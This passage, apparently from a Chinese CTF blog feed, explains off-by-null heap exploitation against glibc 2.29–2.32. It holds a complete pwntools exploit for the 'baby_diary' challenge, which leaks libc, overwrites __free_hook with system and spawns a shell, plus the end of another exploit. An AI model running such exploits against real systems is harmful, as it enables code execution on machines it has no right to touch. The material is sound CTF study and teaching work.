p.sendline(str(<span class="number">-0x69</span>+i))</span><br><span class="line">    p.sendline(sys[i<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">shall=<span class="string">'\x00\x00/bin/sh\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">p.sendline(str(<span class="number">15</span>))</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高版本libc(2.29-2.32) off by null利用姿势笔记</title>
    <link href="lexsd6.github.io/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
    <id>lexsd6.github.io/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</id>
    <published>2021-07-12T14:21:16.534Z</published>
    <updated>2021-09-16T05:42:00.524Z</updated>
    
    <content type="html"><![CDATA[<p>个人理解off by null 是 off by one的一种特例, off by null指我们可以控制堆块向下一个堆块溢出一个字节的数据，而该数据只能为’\x00’的情况。如果像常规off by one 是溢出任意一个字节，那么就可以修改下一个堆块的大小，而off by null则不能，它仅仅只可以将下一个堆块的inuse位置零.<a id="more"></a></p><h2 id="高版本libc改动影响"><a href="#高版本libc改动影响" class="headerlink" title="高版本libc改动影响"></a>高版本libc改动影响</h2><p>我们在2.29前 ,我们只需要按照下面来布局堆块:</p><p><img src="image-20210713000221116.png" alt="image-20210713000221116"></p><p>然后按照下面步骤:</p><ol><li>先释放chunk A.</li><li>通过chunk B,利用off by one漏洞在 修改chunk C presize 值为 chunk A size +chunk B size的同时,将chunk C的prev_inuse值覆盖为’\x00’.</li><li>再释放chunk C。</li></ol><p><img src="image-20210712235502736.png" alt="image-20210712235502736"></p><p>即可让chunk A B C 合并为一块大的chunk。</p><p> 但是在2.29后的libc在两个free chunk 进行合并前多一次对<code>prevsize</code>的值检查对应的源代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  <span class="built_in">size</span> += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>导致我们如果按照上面所说的方法在<code>if (__glibc_unlikely (chunksize(p) != prevsize))</code>时,无法成功通过.因为此时<code>prevsize</code>为的<code>A size+ B size</code>但p的size仅仅为<code>A size</code>.</p><h2 id="爆破法"><a href="#爆破法" class="headerlink" title="爆破法"></a>爆破法</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>爆破法我借鉴的是nopnoping爷爷的思路：<a href="https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></p><p>爆破法的思路比较简单:</p><p>1.分配一个chunk ,将使下一块chunk地址的后三位抬高为<code>0x000</code>,并有机会出现后四位都是<code>0x0000</code>的情况.</p><p>2.分配一个范围大于tcache的最大值并且在largebin范围内的chunk A.</p><p>3.分配一个隔离chunk k.</p><p><img src="image-20210713163115172.png" alt="image-20210713163115172"></p><p>4.释放chunk A,在chunk A分配 chunk B,chunk C,chunkD,chunk F ,chunk E.要求chunk C 和chunk  D最好相邻且大小相同,同时让chunk B和 chunk D前14位相同,要求chunk F和chunk E 最好相邻.</p><p>5.释放chunk C 和chunk D 让其合并为smallbins,</p><p>6.分配chunk G 大小是让chunk G分配后,原chunk A 巧好剩下巧好空间H为chunk C +chunk  D的大小.</p><p>7.分配一个大的chunk,让原chunk A 剩下空间H加入smallbins.</p><p>8.重新分配chunk C,chunk D.让chunk C  bk 中addr为chunk D.同时修改其bk为 chunk B addr.</p><p>9.修改chunk B的bk为fake size，fd修改为chunk C addr .</p><p>10.先释放D再释放B，在分配回chunk B ,让原来chunk B fd 位置的值为chunk B addr</p><p>+0x10.</p><p>11.通过chunk F 修改 chunk E 的<code>prevsize</code>值为fake size，并覆盖E的prev_inuse值为0.</p><p> <img src="image-20210713175759641.png" alt="image-20210713175759641"></p><p>12.释放chunk E， B、C、D、F、E合并。</p><h3 id="例题-qwb-2021-baby-diary"><a href="#例题-qwb-2021-baby-diary" class="headerlink" title="例题:qwb_2021_baby_diary"></a>例题:qwb_2021_baby_diary</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="comment">#sh=process('./baby_diary')</span></span><br><span class="line"><span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">elf=ELF(<span class="string">'./baby_diary'</span>)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content=<span class="string">'/bin/sh\x00'</span>)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4ba0</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x600</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#9</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#10 x</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#11 x</span></span><br><span class="line">    add(<span class="number">0x47</span>)<span class="comment">#12 x</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,p8(<span class="number">0</span>))<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#4,5,6,10, 11,13,14</span></span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)+p8(<span class="number">0x10</span>)) <span class="comment">#15  x</span></span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'5555555'</span>)<span class="comment">#16 x</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0x190</span>)+p64(<span class="number">0x101</span>)+p8(<span class="number">0x40</span>))<span class="comment">#</span></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)*<span class="number">6</span>+p8(<span class="number">0</span>)*<span class="number">6</span>)<span class="comment">#16</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p8(<span class="number">0</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#17+23</span></span><br><span class="line">        add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>)<span class="comment">#0</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'1'</span>*<span class="number">7</span>)<span class="comment">#17</span></span><br><span class="line"><span class="comment">#    free(14)</span></span><br><span class="line"><span class="comment">#    add(0x37,p64(1)+p8(0)*8)</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>)                     </span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">3</span>)    </span><br><span class="line">    show(<span class="number">17</span>)</span><br><span class="line">    addr=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-391</span></span><br><span class="line">    log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line">    malloc=addr<span class="number">-0x10</span></span><br><span class="line">    log.info(<span class="string">'malloc_hook:'</span>+hex(malloc))</span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc,num=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">multi libc results:</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[!] you can choose it by hand</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'22222'</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p64(x.dump(<span class="string">'__free_hook'</span>)))<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x57</span>)<span class="comment">#17</span></span><br><span class="line">    add(<span class="number">0x57</span>,p64(x.dump(<span class="string">'system'</span>))) <span class="comment">#18</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#add(0x57,'')#18</span></span><br><span class="line"> <span class="comment">#   free(1)</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sh=process(<span class="string">"./baby_diary"</span>)</span><br><span class="line">        <span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn2()</span><br><span class="line">            gdb.attach(sh)</span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><h2 id="直接法"><a href="#直接法" class="headerlink" title="直接法"></a>直接法</h2><p>直接法我是在wjh爷爷的博客上了解的<a href="http://blog.wjhwjhn.com/archives/193/" target="_blank" rel="noopener">http://blog.wjhwjhn.com/archives/193/</a></p><p>这个方法有关弊端，如果题目<code>\n</code>不能替换‘\x00’就需要题目有show功能，否则还是得爆。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>1.创造4个大于tcache的最大值并且在largebin范围内的chunk A、B、C、D。让B、C相邻外，其他chunk 间都有隔离块隔离同时chunk C的地址为末位为<code>0x00</code>。</p><p>2.按照顺序释放A、C、D，形成largebins 链表。</p><p><img src="image-20210713184123575.png" alt="image-20210713184123575"></p><p>3.释放chunk B，让chunk B和chunk C产生合并。</p><p><img src="image-20210713184333651.png" alt="image-20210713184333651"></p><p>4.创建大小比原来chunk B多0x20size 的new chunk B。让old chunk C的 old fd 与old bk保留在new chunk 底部。创建大小比原来chunk C少0x20size 的new chunk C。</p><p>5.将chunk A和chunk B复原。</p><p><img src="image-20210713185405449.png" alt="image-20210713185405449"></p><p>6.按照顺序释放 A、new C、D，形成largebins 链表。</p><p>7.修改chunk A bf 值为old chunk C addr。修改chunk D fd 值为old chunk C addr。</p><p>8.通过new chunk B修改  old chunk C size 为fake size。通过new chunk C 修改隔离chunk的<code>prevsize</code>值为fake size，</p><p> <img src="image-20210713190210228.png" alt="image-20210713190210228"></p><p>9.free 隔离chunk即出现合并。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>没有找到合适的，于是选来自nopnoping爷爷博客的例题，源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"><span class="keyword">long</span> *<span class="built_in">point</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">&#125;chunks[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Size?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;<span class="built_in">size</span>);</span><br><span class="line">chunks[index].<span class="built_in">point</span>=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"malloc error!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">chunks[index].<span class="built_in">size</span>=<span class="built_in">size</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"It's blank!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(chunks[index].<span class="built_in">point</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span 